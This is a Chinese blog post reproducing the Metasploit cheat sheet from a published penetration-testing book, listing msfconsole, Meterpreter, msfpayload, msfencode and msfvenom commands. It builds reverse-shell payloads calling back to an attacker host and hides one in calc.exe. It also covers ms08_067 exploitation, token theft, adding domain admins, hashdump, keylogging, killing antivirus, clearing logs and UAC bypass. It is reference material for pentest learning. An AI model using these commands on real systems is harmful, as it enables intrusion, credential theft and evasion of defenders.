<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Penetration,MSF,">





  <link rel="alternate" href="/atom.xml" title="G2EX" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。 一、MSF终端命令show exploitsShow all exploits within the Framework.列出Metasploit框架中的所有渗透攻击模块。 show payloadsShow all payl">
<meta name="keywords" content="Penetration,MSF">
<meta property="og:type" content="article">
<meta property="og:title" content="MSF命令参考">
<meta property="og:url" content="https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/index.html">
<meta property="og:site_name" content="G2EX">
<meta property="og:description" content="以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。 一、MSF终端命令show exploitsShow all exploits within the Framework.列出Metasploit框架中的所有渗透攻击模块。 show payloadsShow all payl">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2020-11-25T02:09:19.688Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MSF命令参考">
<meta name="twitter:description" content="以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。 一、MSF终端命令show exploitsShow all exploits within the Framework.列出Metasploit框架中的所有渗透攻击模块。 show payloadsShow all payl">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/">





  <title> MSF命令参考 | G2EX </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?0056c67deccbe6617d059b40d352195f";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">G2EX</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Yaming Gong">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/avatar.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="G2EX">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="G2EX" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                MSF命令参考
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-06-09T09:50:00+00:00">
                2015-06-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <a href="/2015/06/09/MSF-Cheat-Sheet/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/06/09/MSF-Cheat-Sheet/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。</p>
<h2 id="一、MSF终端命令"><a href="#一、MSF终端命令" class="headerlink" title="一、MSF终端命令"></a>一、MSF终端命令</h2><p><code>show exploits</code><br>Show all exploits within the Framework.<br>列出Metasploit框架中的所有渗透攻击模块。</p>
<p><code>show payloads</code><br>Show all payloads within the Framework.<br>列出Metasploit框架中所有的攻击载荷。</p>
<p><code>show auxiliary</code><br>Show all auxiliary modules within the Framework.<br>列出Metasploit框架中的所有辅助攻击模块。</p>
<p><code>search name</code><br>Search for exploits or modules within the Framework.<br>查找Metasploit框架中所有的渗透攻击和其他模块。</p>
<p><code>info</code><br>Load information about a specific exploit or module.<br>展示出指定渗透攻击或模块的相关信息。</p>
<p><code>use name</code><br>Load an exploit or module (example: use windows/smb/psexec).<br>装载一个渗透攻击或者模块（例如：使用windows/smb.psexec）。</p>
<p><code>LHOST</code><br>Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.<br>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要一个公共的IP地址，特别为反弹式shell使用。</p>
<p><code>RHOST</code><br>The remote host or the target.<br>远程主机或是目标主机。</p>
<p><code>set function</code><br>Set a specific value (for example,  LHOST or  RHOST ).<br>设置特定的配置参数（例如：设置本地或远程主机参数）。</p>
<p><code>setg function</code><br>Set a specific value globally (for example,  LHOST or  RHOST ).<br>以全局方式设置特定的配置参数（例如：设置本地或远程主机参数）。</p>
<p><code>show options</code><br>Show the options available for a module or exploit.<br>列出某个渗透攻击或模块中所有的配置参数。</p>
<p><code>show targets</code><br>Show the platforms supported by the exploit.<br>列出渗透攻击所支持的目标平台。</p>
<p><code>set target num</code><br>Specify a specific target index if you know the OS and service pack.<br>指定你所知道的目标的操作系统以及补丁版本类型。</p>
<p><code>set payload payload</code><br>Specify the payload to use.<br>指定想要使用的攻击载荷。</p>
<p><code>show advanced</code><br>Show advanced options.<br>列出所有高级配置选项。</p>
<p><code>set autorunscript migrate -f</code><br>Automatically migrate to a separate process upon exploit completion.<br>在渗透攻击完成后，将自动迁移到另一个进程。</p>
<p><code>check</code><br>Determine whether a target is vulnerable to an attack.<br>检测目标是否对选定渗透攻击存在相应安全漏洞。</p>
<p><code>exploit</code><br>Execute the module or exploit and attack the target.<br>执行渗透攻击或模块来攻击目标。</p>
<p><code>exploit -j</code><br>Run the exploit under the context of the job. (This will run the exploit in the background.)<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</p>
<p><code>exploit -z</code><br>Do not interact with the session after successful exploitation.<br>渗透攻击成功后不与会话进行交互。</p>
<p><code>exploit -e encoder</code><br>Specify the payload encoder to use (example:  exploit –e shikata_ga_nai ).<br>制定使用的攻击载荷编码方式（例如：exploit -e shikata_ga_nai）。</p>
<p><code>exploit -h</code><br>Display help for the  exploit command.<br>列出exploit命令的帮助信息。</p>
<p><code>sessions -l</code><br>List available sessions (used when handling multiple shells).<br>列出可用的交互会话（在处理多个shell时使用）。</p>
<p><code>sessions -l -v</code><br>List all available sessions and show verbose fields, such as which vulnera-bility was used when exploiting the system.<br>列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。</p>
<p><code>sessions -s script</code><br>Run a specific Meterpreter script on all Meterpreter live sessions.<br>在所有活跃的Meterpreter会话中运行一个特定的Meterpreter脚本。</p>
<p><code>sessions -K</code><br>Kill all live sessions.<br>杀死所有活跃的交互会话。</p>
<p><code>sessions -c cmd</code><br>Execute a command on all live Meterpreter sessions.<br>在所有活跃的Meterpreter会话上执行一个命令。</p>
<p><code>sessions -u sessionID</code><br>Upgrade a normal Win32 shell to a Meterpreter console.<br>升级一个普通的Win32 shell到Meterpreter shell。</p>
<p><code>db_create name</code><br>Create a database to use with database-driven attacks (example:  db_create autopwn).<br>创建一个数据库驱动攻击所要使用的数据库（例如：db_create autopwn）。</p>
<p><code>db_connect name</code><br>Create and connect to a database for driven attacks (example:  db_connect autopwn).<br>创建并连接一个数据库驱动攻击所要使用的数据库（例如：db_conect autopwn）。</p>
<p><code>db_nmap</code><br>Use nmap and place results in database. (Normal nmap syntax is supported, such as  –sT –v –P0.)<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语法，例如：-sT -v -P0）。</p>
<p><code>db_autopwn -h</code><br>Display help for using  db_autopwn .<br>展示出db_autopwn命令的帮助信息。</p>
<p><code>db_autopwn -p -r -e</code><br>Run  db_autopwn against all ports found, use a reverse shell, and exploit all systems.<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p>
<p><code>db_destroy</code><br>Delete the current database.<br>删除当前数据库。</p>
<p><code>db_destroy user:password@host:port/database</code><br>Delete database using advanced options.<br>使用高级选项来删除数据库。</p>
<h2 id="二、Meterpreter命令"><a href="#二、Meterpreter命令" class="headerlink" title="二、Meterpreter命令"></a>二、Meterpreter命令</h2><p><code>help</code><br>Open Meterpreter usage help.<br>打开Meterpreter使用帮助。</p>
<p><code>run scriptname</code><br>Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.<br>运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p>
<p><code>sysinfo</code><br>Show the system information on the compromised target.<br>列出受控主机的系统信息。</p>
<p><code>ls</code><br>List the files and folders on the target.<br>列出目标主机的文件和文件夹信息。</p>
<p><code>use priv</code><br>Load the privilege extension for extended Meterpreter libraries.<br>加载特权提升扩展模块，来扩展Meterpreter库。</p>
<p><code>ps</code><br>Show all running processes and which accounts are associated with each process.<br>显示所有运行进程以及关联的用户账户。</p>
<p><code>migrate PID</code><br>Migrate to the specific process ID (PID is the target process ID gained from the  ps command).<br>迁移到一个指定的进程ID（PID号可通过ps命令从目标主机上获得）。</p>
<p><code>use incognito</code><br>Load incognito functions. (Used for token stealing and impersonation on a target machine.)<br>加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户）。</p>
<p><code>list_tokens -u</code><br>List available tokens on the target by user.<br>列出目标主机用户的可用令牌。</p>
<p><code>list_tokens -g</code><br>List available tokens on the target by group.<br>列出目标主机用户组的可用令牌。</p>
<p><code>impersonate_token DOMAIN_NAME\\USERNAME</code><br>Impersonate a token available on the target.<br>假冒目标主机上的可用令牌。</p>
<p><code>steal_token PID</code><br>Steal the tokens available for a given process and impersonate that token.<br>盗窃给定进行的可用令牌并进行令牌假冒。</p>
<p><code>drop_token</code><br>Stop impersonating the current token.<br>停止假冒当前令牌。</p>
<p><code>getsystem</code><br>Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.<br>通过各种攻击向量来提升到系统用户权限。</p>
<p><code>shell</code><br>Drop into an interactive shell with all available tokens.<br>以所有可用令牌来运行一个交互的Shell。</p>
<p><code>execute -f cmd.exe -i</code><br>Execute cmd.exe and interact with it.<br>执行cmd.exe命令并进行交互。</p>
<p><code>execute -f cmd.exe -i -t</code><br>Execute cmd.exe with all available tokens.<br>以所有可用令牌来执行cmd命令。</p>
<p><code>execute -f cmd.exe -i -H -t</code><br>Execute cmd.exe with all available tokens and make it a hidden process.<br>以所有可用令牌来执行cmd命令并隐藏该进程。</p>
<p><code>rev2self</code><br>Revert back to the original user you used to compromise the target.<br>回到控制目标主机的初始用户账户下。</p>
<p><code>reg command</code><br>Interact, create, delete, query, set, and much more in the target’s registry.<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</p>
<p><code>setdesktop number</code><br>Switch to a different screen based on who is logged in.<br>切换到另一个用户界面（该功能基于哪些用户已登录）。</p>
<p><code>screenshot</code><br>Take a screenshot of the target’s screen.<br>对目标主机的屏幕进行截图。</p>
<p><code>upload file</code><br>Upload a file to the target.<br>向目标主机上传文件。</p>
<p><code>download file</code><br>Download a file from the target.<br>从目标主机下载文件。</p>
<p><code>keyscan_start</code><br>Start sniffing keystrokes on the remote target.<br>针对远程目标主机开启键盘记录功能。</p>
<p><code>keyscan_dump</code><br>Dump the remote keys captured on the target.<br>存储目标主机上捕获的键盘记录。</p>
<p><code>keyscan_stop</code><br>Stop sniffing keystrokes on the remote target.<br>停止针对目标主机的键盘记录。</p>
<p><code>getprivs</code><br>Get as many privileges as possible on the target.<br>尽可能多的获取目标主机上的特权。</p>
<p><code>uictl enable keyboard/mouse</code><br>Take control of the keyboard and/or mouse.<br>接管目标主机的键盘和鼠标。</p>
<p><code>background</code><br>Run your current Meterpreter shell in the background.<br>将你当前的Meterpreter shell转为后台执行。</p>
<p><code>hashdump</code><br>Dump all hashes on the target.<br>导出目标主机中的口令哈希值。</p>
<p><code>use sniffer</code><br>Load the sniffer module.<br>加载嗅探模块。</p>
<p><code>sniffer_interfaces</code><br>List the available interfaces on the target.<br>列出目标主机所有开放的网络接口。</p>
<p><code>sniffer_dump interfaceID pcapname</code><br>Start sniffing on the remote target.<br>在目标主机上启动嗅探。</p>
<p><code>sniffer_start interfaceID packet-buffer</code><br>Start sniffing with a specific range for a packet buffer.<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p>
<p><code>sniffer_stats interfaceID</code><br>Grab statistical information from the interface you are sniffing.<br>获取正在实施嗅探网络接口的统计数据。</p>
<p><code>sniffer_stop interfaceID</code><br>Stop the sniffer.<br>停止嗅探。</p>
<p><code>add_user username password -h ip</code><br>Add a user on the remote target.<br>在远程目标主机上添加一个用户。</p>
<p><code>add_group_user &quot;Domain Admins&quot; username -h ip</code><br>Add a username to the Domain Administrators group on the remote target.<br>将用户添加到目标主机的域管理员组中。</p>
<p><code>clearev</code><br>Clear the event log on the target machine.<br>清除目标主机上的日志记录。</p>
<p><code>timestomp</code><br>Change file attributes, such as creation date (antiforensics measure).<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</p>
<p><code>reboot</code><br>Reboot the target machine.<br>重启目标主机。</p>
<h2 id="三、MSFpyaload命令"><a href="#三、MSFpyaload命令" class="headerlink" title="三、MSFpyaload命令"></a>三、MSFpyaload命令</h2><p><code>msfpayload -h</code><br>List available payloads.<br>MSFpayload的帮助信息。</p>
<p><code>msfpayload windows/meterpreter/bind_tcp O</code><br>List available options for the  windows/meterpreter/bind_tcp payload (all of these can use any payload).<br>列出所有windows/meterpreter/bind_tcp下攻击载荷的配置项（任何攻击载荷都是可以配置的）。</p>
<p><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X &gt; payload.exe</code><br>Create a Meterpreter reverse_tcp payload to connect back to 192.168.1.5 and on port 443, and then save it as a Windows Portable Executable named payload.exe.<br>创建一个Meterpreter的reverse_tcp攻击载荷，回连到192.168.1.5的443端口，将其保存为名为payload.exe的Windows可执行程序。</p>
<p><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R &gt; payload.raw</code><br>Same as above, but export as raw format. This will be used later in msfencode.<br>与上面生成同样的攻击载荷，但导出成原始格式的文件，该文件将在后面的MSFencode中使用。</p>
<p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c</code><br>Same as above but export as C-formatted shellcode.<br>与上面生成同样的攻击载荷，但导出成C格式的shellcode。</p>
<p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java</code><br>Export as %u encoded JavaScript.<br>导出成以%u编码方式的JavaScript语言字符串。</p>
<h2 id="四、MSFencode命令"><a href="#四、MSFencode命令" class="headerlink" title="四、MSFencode命令"></a>四、MSFencode命令</h2><p><code>msfencode -h</code><br>Display the msfencode help.<br>列出MSFencode的帮助信息。</p>
<p><code>msfencode -l</code><br>List the available encoders.<br>列出所有可用的编码器。</p>
<p><code>msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)</code><br>Format to display the encoded buffer.<br>显示编码器缓冲区的格式。</p>
<p><code>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</code><br>Encode payload.raw with shikata_ga_nai five times and export it to an output file named encoded_payload.exe.<br>使用shikata_ga_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。</p>
<p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/ _countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</code><br>Create a multi-encoded payload.<br>创建一个经过多重编码格式签到编码的攻击载荷。</p>
<p><code>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c</code><br>Create pure alphanumeric shellcode where ESI points to the shellcode; output in C-style notation.<br>创建一个纯字母数字的shellcode，由ESI寄存器执行shellcode，以C语言格式输出。</p>
<h2 id="五、MSFcli命令"><a href="#五、MSFcli命令" class="headerlink" title="五、MSFcli命令"></a>五、MSFcli命令</h2><p><code>msfcli | grep exploit</code><br>Show only exploits.<br>仅列出渗透攻击模块。</p>
<p><code>msfcli | grep exploit/windows</code><br>Show only Windows exploits.<br>仅列出与Windows相关的渗透攻击模块。</p>
<p><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E</code><br>Launch  ms08_067_netapi exploit at 172.16.32.142 with a bind_tcp payload being delivered to listen on port 443.<br>对172.16.32.142发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。</p>
<h2 id="六、Metasploit高级忍术"><a href="#六、Metasploit高级忍术" class="headerlink" title="六、Metasploit高级忍术"></a>六、Metasploit高级忍术</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</span><br></pre></td></tr></table></figure>

<p>创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序paylaod.exe</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</span><br></pre></td></tr></table></figure>

<p>创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会在目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算器程序打开呈现在目标用户前面。同样，最后生成用.shikata_ga_nai编码的攻击载荷程序payload.exe。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/handler PAYLOAD=windows/ meterpreter/bind_tcp LPORT=443 E</span><br></pre></td></tr></table></figure>

<p>创建一个raw格式bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出一payload.exe命名的Windows可执行程序文件，同时启用多路监听方式进行执行。</p>
<h2 id="七、MSFvenom"><a href="#七、MSFvenom" class="headerlink" title="七、MSFvenom"></a>七、MSFvenom</h2><p>利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload</span><br><span class="line">windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 &gt; msf.exe</span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)</span><br><span class="line">root@bt://opt/framework3/msf3<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这一行命令就可以创建一个攻击载荷并自动产生可执行文件格式。</p>
<h2 id="八、Meterpreter后渗透攻击阶段命令"><a href="#八、Meterpreter后渗透攻击阶段命令" class="headerlink" title="八、Meterpreter后渗透攻击阶段命令"></a>八、Meterpreter后渗透攻击阶段命令</h2><p>在Windows主机上使用Meterpreter进行提权操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>

<p>从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1784</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net user metasploit p@55w0rd /ADD /DOMAIN</span><br><span class="line">C:\Windows\system32&gt;net group <span class="string">"Domain Admins"</span> metasploit /ADD /DOMAIN</span><br></pre></td></tr></table></figure>

<p>从SAM数据库中导出密码的哈希值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>

<p>提示：在Windows 2008中，如果getsystem命令和hashdump命令导出异常情况时，你需要迁移到一个以SYSMTEM系统权限运行的进程中。</p>
<p>自动迁移到一个独立进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run migrate</span><br></pre></td></tr></table></figure>

<p>通过Meterpreter的killav脚本来杀死目标主机运行的杀毒软件进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br></pre></td></tr></table></figure>

<p>针对一个特定的进程捕获目标主机上的键盘记录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">meterpreter &gt; migrate 1436</span><br><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">meterpreter &gt; keyscan_stop</span><br></pre></td></tr></table></figure>

<p>用匿名方式来假冒管理员：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; impersonate_token IHAZSECURITY\\Administrator</span><br></pre></td></tr></table></figure>

<p>查看目标主机都采取了哪些防护措施，列出帮助菜单，关闭防火墙以及其他我们发现的防护措施：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getcountermeasure</span><br><span class="line">meterpreter &gt; run getcountermeasure -h</span><br><span class="line">meterpreter &gt; run getcountermeasure -d -k</span><br></pre></td></tr></table></figure>

<p>识别被控制的主机是否是一台虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run checkvm</span><br></pre></td></tr></table></figure>

<p>在一个Meterpreter会话界面中使用cmd shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<p>获取目标主机的图形界面（VNC）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run vnc</span><br></pre></td></tr></table></figure>

<p>使正在运行的Meterpreter界面在后台运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br></pre></td></tr></table></figure>

<p>绕过Windows的用户账户控制（UAC）机制：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/escalate/bypassuac</span><br></pre></td></tr></table></figure>

<p>导出苹果OS-X系统的口令哈希值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/osx/gather/hashdump</span><br></pre></td></tr></table></figure>

<p>导出Linux系统的口令哈希值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/linux/gather/hashdump</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>《Metasploit渗透测试指南》附录B</li>
<li>《Metasploit-The Penetration Tester’s Guide》B:Cheat Sheet</li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Penetration/" rel="tag"># Penetration</a>
          
            <a href="/tags/MSF/" rel="tag"># MSF</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2015/05/18/Man-in-the-Middle-Attack/" rel="next" title="MITM中间人攻击">
                <i class="fa fa-chevron-left"></i> MITM中间人攻击
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2015/06/29/Cookie-and-Cookie-Injection/" rel="prev" title="Cookie与Cookie劫持">
                Cookie与Cookie劫持 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
